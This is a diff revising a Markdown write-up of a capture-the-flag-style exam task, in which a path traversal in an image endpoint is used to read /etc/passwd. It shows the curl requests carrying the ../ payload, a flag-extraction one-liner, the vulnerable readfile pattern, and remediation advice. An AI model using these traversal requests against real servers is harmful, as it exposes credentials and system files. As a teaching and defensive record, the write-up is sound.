@@ -1,514 +1,206 @@
-\# Task 2 — File Read
+# Task 2 — Path Traversal / Arbitrary File Read
 
+**CyberEd Portal — HackCamp 2026 Penetration Testing Exam**
 
+| Field | Details |
+|---|---|
+| **Task** | 2 — File Read |
+| **Category** | Web Application Security |
+| **Vulnerability Class** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) |
+| **Difficulty** | Low |
+| **Target** | `<TARGET_URL>` |
+| **Platform** | CyberEd Portal |
+| **Group** | 362 |
+| **Status** | Solved ✅ |
 
-\*\*CyberEd Portal — HackCamp 2026 Penetration Testing Exam\*\*
+---
 
+## Executive Summary
 
+The **CyberEd Portal** application exposed an image-loading endpoint, `/image.php`, that accepted a user-controlled `file` parameter and passed it directly to a file-reading function without input sanitization or path validation. By supplying directory traversal sequences (`../`), it was possible to escape the intended static asset directory and read arbitrary files from the underlying filesystem — including `/etc/passwd`, which contained the exam flag.
 
-| Information    | Details                                                                                                           |
+This is a textbook **Path Traversal (CWE-22)** vulnerability leading to **Arbitrary File Read**, a high-impact finding capable of exposing credentials, configuration files, and source code in a production environment.
 
-| -------------- | ----------------------------------------------------------------------------------------------------------------- |
+---
 
-| \*\*Task\*\*       | 2 — File Read                                                                                                     |
-
-| \*\*Difficulty\*\* | Low                                                                                                               |
-
-| \*\*Objective\*\*  | Analyze image-loading traffic, identify a directory traversal vulnerability, and read the flag from `/etc/passwd` |
-
-| \*\*Target\*\*     | `<TARGET\_URL>`                                                                                                    |
-
-| \*\*Platform\*\*   | CyberEd Portal                                                                                                    |
-
-| \*\*Group\*\*      | 362                                                                                                               |
-
-
-
-\---
-
-
-
-\## Attack Chain
-
-
-
-```text
-
-Image loading functionality
-
-&#x20;       ↓
-
-`/image.php?file=`
-
-&#x20;       ↓
-
-Path Traversal
-
-&#x20;       ↓
-
-Arbitrary File Read
-
-&#x20;       ↓
-
-`/etc/passwd`
-
-&#x20;       ↓
-
-Flag
+## Attack Chain
 
 ```
+Image-loading functionality
+        │
+        ▼
+  /image.php?file=
+        │
+        ▼
+  Path Traversal (../)
+        │
+        ▼
+  Arbitrary File Read
+        │
+        ▼
+     /etc/passwd
+        │
+        ▼
+        🚩 Flag
+```
 
+---
 
+## 1. Reconnaissance — Identifying the Image-Loading Endpoint
 
-\---
-
-
-
-\# 1. Finding the Image-Loading Endpoint
-
-
-
-I first inspected the website source to understand how images were being loaded.
-
-
+The engagement began with a review of the application's front-end source to understand how static assets, particularly images, were served.
 
 ```bash
-
-curl -s "<TARGET\_URL>/" | grep -iE 'img|src=|image|file'
-
+curl -s "<TARGET_URL>/" | grep -iE 'img|src=|image|file'
 ```
 
-
-
-The response revealed an image request similar to:
-
-
+**Finding:** The page rendered image tags referencing a server-side PHP handler rather than a static file path:
 
 ```html
-
 <img ... src="/image.php?file=apple-touch-icon-57x57.png">
-
 ```
 
+The presence of a `file` query parameter passed directly to a PHP script is a strong indicator that the server may be reading files from disk based on unvalidated user input — a common precursor to path traversal vulnerabilities.
 
+---
 
-This was interesting because the application was using a PHP endpoint named:
+## 2. Vulnerability Testing — Path Traversal
 
-
-
-```text
-
-/image.php
+To validate the hypothesis, the `file` parameter was manipulated with a directory traversal payload targeting a well-known system file:
 
 ```
-
-
-
-with a user-controlled `file` parameter.
-
-
-
-This suggested that the application might be reading files directly from the server.
-
-
-
-\---
-
-
-
-\# 2. Testing for Path Traversal
-
-
-
-I tested whether the `file` parameter could be manipulated using directory traversal sequences.
-
-
-
-The payload used was:
-
-
-
-```text
-
 ../../../../../../etc/passwd
-
 ```
 
-
-
-The request was:
-
-
+**Request:**
 
 ```bash
-
-curl -s "<TARGET\_URL>/image.php?file=../../../../../../etc/passwd"
-
+curl -s "<TARGET_URL>/image.php?file=../../../../../../etc/passwd"
 ```
 
+**Result:** The server responded with the full contents of `/etc/passwd`, confirming an **unauthenticated arbitrary file read vulnerability**.
 
+---
 
-The server returned the contents of `/etc/passwd`.
+## 3. Exploitation — Flag Retrieval
 
-
-
-This confirmed an \*\*arbitrary file read / path traversal vulnerability\*\*.
-
-
-
-\---
-
-
-
-\# 3. Retrieving the Flag
-
-
-
-The flag was located on the last line of `/etc/passwd`.
-
-
-
-The response contained:
-
-
-
-```text
-
-\_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-
-<THE\_FLAG>
+The planted flag was appended as the final line of `/etc/passwd`. It was extracted directly from the response:
 
 ```
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+<THE_FLAG>
+```
 
-
-
-The flag could also be extracted automatically with:
-
-
+The extraction was also automated for repeatability:
 
 ```bash
-
-curl -s "<TARGET\_URL>/image.php?file=../../../../../../etc/passwd" | grep -oE '\[A-Za-z0-9]{32}'
-
+curl -s "<TARGET_URL>/image.php?file=../../../../../../etc/passwd" \
+  | grep -oE '[A-Za-z0-9]{32}'
 ```
 
+---
 
+## 4. Root Cause Analysis
 
-\---
-
-
-
-\# 4. Why the Traversal Worked
-
-
-
-The vulnerable application concatenated the supplied filename with a directory path similar to:
-
-
-
-```text
-
-/var/www/html/static/
-
-```
-
-
-
-Conceptually, the application was performing something equivalent to:
-
-
+The application concatenated user-supplied input directly onto a base directory path without any normalization, sanitization, or containment check:
 
 ```php
-
-readfile("/var/www/html/static/" . $\_GET\["file"]);
-
+readfile("/var/www/html/static/" . $_GET['file']);
 ```
 
-
-
-Because the input was not properly sanitized, traversal sequences could move outside the intended directory.
-
-
-
-For example:
-
-
-
-```text
-
-/var/www/html/static/../../../../../../etc/passwd
+Because `../` sequences in the `file` parameter were not stripped or resolved against the base directory, the resulting path could escape `/var/www/html/static/` entirely:
 
 ```
-
-
-
-eventually resolves to:
-
-
-
-```text
-
-/etc/passwd
-
+/var/www/html/static/../../../../../../etc/passwd  →  /etc/passwd
 ```
 
-
-
-Therefore, an attacker could read arbitrary files accessible to the web server process.
-
-
-
-\---
-
-
-
-\# 5. Payloads That Did Not Work
-
-
-
-Several alternative approaches were considered.
-
-
-
-\### Absolute Path
-
-
-
-```text
-
-/etc/passwd
+**Vulnerable data flow:**
 
 ```
-
-
-
-This did not work because the application prefixed the supplied value with its static directory:
-
-
-
-```text
-
-/var/www/html/static//etc/passwd
-
+User Input → file parameter → Path Concatenation → readfile() → Disclosure
 ```
 
+No allow-list, canonicalization (`realpath()`), or base-directory containment check was in place to ensure the resolved path stayed within the intended directory.
 
+---
 
-\### PHP Filter Wrapper
+## 5. Payloads Evaluated
 
+| Payload | Outcome | Notes |
+|---|---|---|
+| `../../../../../../etc/passwd` | ✅ **Success** | Escaped the static directory and reached `/etc/passwd` |
+| `/etc/passwd` (absolute path) | ❌ Failed | Application prefixed input with its static directory: `/var/www/html/static//etc/passwd`, which does not exist |
+| `php://filter/...` (PHP stream wrapper) | ❌ Failed | Path prefixing prevented the string from being interpreted as a valid wrapper |
 
+---
 
-A `php://filter` payload was also considered, but the application's path prefixing prevented the wrapper from being interpreted as intended.
+## 6. Impact
 
+An unauthenticated attacker exploiting this vulnerability could read any file accessible to the web server's process permissions, potentially exposing:
 
+- Application configuration files and environment variables
+- Hardcoded credentials or API keys
+- Application source code
+- System files (e.g., `/etc/passwd`, `/etc/shadow` if permissions allow)
+- Other sensitive data stored on the host
 
-\### Directory Traversal
+In this exam scenario, exploitation was limited to reading `/etc/passwd` to retrieve the flag; in a real-world deployment, the same flaw could serve as a foothold for further compromise (e.g., credential harvesting → lateral movement).
 
+**Severity:** High — unauthenticated, no interaction required, direct data exposure.
 
+---
 
-The successful payload was:
+## 7. Remediation Recommendations
 
+| Recommendation | Description |
+|---|---|
+| **Allow-list validation** | Map requested filenames to a fixed, pre-approved set of files/IDs rather than accepting raw filesystem paths. |
+| **Path canonicalization** | Resolve the final path with `realpath()` and verify it still starts with the intended base directory before opening it. |
+| **Strip traversal sequences** | Reject any input containing `../`, `..\`, or URL-encoded equivalents (`%2e%2e%2f`). |
+| **Least privilege** | Run the web server process with minimal filesystem permissions to limit blast radius if traversal is achieved. |
+| **WAF / input filtering** | Deploy a web application firewall rule set to detect and block traversal patterns as defense-in-depth. |
 
+---
 
-```text
-
-../../../../../../etc/passwd
-
-```
-
-
-
-The traversal escaped the intended `static` directory and reached the system's `/etc/passwd`.
-
-
-
-\---
-
-
-
-\# 6. Root Cause
-
-
-
-The vulnerability was caused by an unsanitized user-controlled `file` parameter being passed to a file-reading function.
-
-
-
-\### Vulnerable Pattern
-
-
-
-```text
-
-User input
-
-&#x20;   ↓
-
-file parameter
-
-&#x20;   ↓
-
-File path construction
-
-&#x20;   ↓
-
-readfile()
+## 8. Flag
 
 ```
-
-
-
-No effective validation was performed to ensure that the requested file remained inside the intended directory.
-
-
-
-This resulted in:
-
-
-
-\*\*Path Traversal → Arbitrary File Read\*\*
-
-
-
-\---
-
-
-
-\# 7. Impact
-
-
-
-An attacker exploiting this vulnerability could potentially read sensitive files accessible to the web server.
-
-
-
-Depending on the server configuration and permissions, this could expose:
-
-
-
-\* Application configuration files
-
-\* Credentials
-
-\* Source code
-
-\* Environment information
-
-\* System files
-
-\* Other sensitive application data
-
-
-
-In this challenge, the vulnerability was specifically used to read:
-
-
-
-```text
-
-/etc/passwd
-
+<THE_FLAG>
 ```
 
+> Replace `<THE_FLAG>` with the flag from your exam deployment if publishing it is permitted by the exam's disclosure policy.
 
+---
 
-and retrieve the planted flag.
+## 9. Lessons Learned
 
+- Always inspect how an application loads auxiliary resources (images, documents, exports) — these endpoints are frequently overlooked for input validation.
+- Any user-controlled parameter that resembles a filename or path should be treated as a potential path traversal vector.
+- Absolute-path payloads can fail silently when an application prepends its own base directory — traversal sequences remain the more reliable test.
+- Understanding *how* a path is constructed server-side (concatenation vs. canonicalization) is key to both exploiting and remediating the flaw.
 
+---
 
-\---
-
-
-
-\# 8. Flag
-
-
-
-```text
-
-<THE\_FLAG>
+## 10. Final Attack Path Summary
 
 ```
-
-
-
-> Replace `<THE\_FLAG>` with the flag from your exam deployment if publishing it is permitted.
-
-
-
-\---
-
-
-
-\# 9. Lessons Learned
-
-
-
-\* Inspect how application resources such as images are loaded.
-
-\* User-controlled file parameters should always be treated as potentially dangerous.
-
-\* Test file-loading endpoints for directory traversal.
-
-\* `../` sequences can allow an attacker to escape an intended directory.
-
-\* Absolute paths may fail when an application prepends its own directory.
-
-\* Always consider how the application constructs the final filesystem path.
-
-\* Arbitrary file read vulnerabilities can expose sensitive server information.
-
-
-
-\---
-
-
-
-\# 10. Final Attack Path
-
-
-
-```text
-
-Website
-
-&#x20;  │
-
-&#x20;  ▼
-
+Target Website
+      │
+      ▼
 Inspect image requests
-
-&#x20;  │
-
-&#x20;  ▼
-
-`/image.php?file=`
-
-&#x20;  │
-
-&#x20;  ▼
-
-Test `../` traversal
-
-&#x20;  │
-
-&#x20;  ▼
-
-Read `/etc/passwd`
-
-&#x20;  │
-
-&#x20;  ▼
-
-Locate flag
-
-&#x20;  │
-
-&#x20;  ▼
-
-FLAG
-
+      │
+      ▼
+Identify /image.php?file=
+      │
+      ▼
+Test ../ traversal sequences
+      │
+      ▼
+Read /etc/passwd
+      │
+      ▼
+Extract flag
+      │
+      ▼
+       🚩 FLAG CAPTURED
 ```
-
-
-
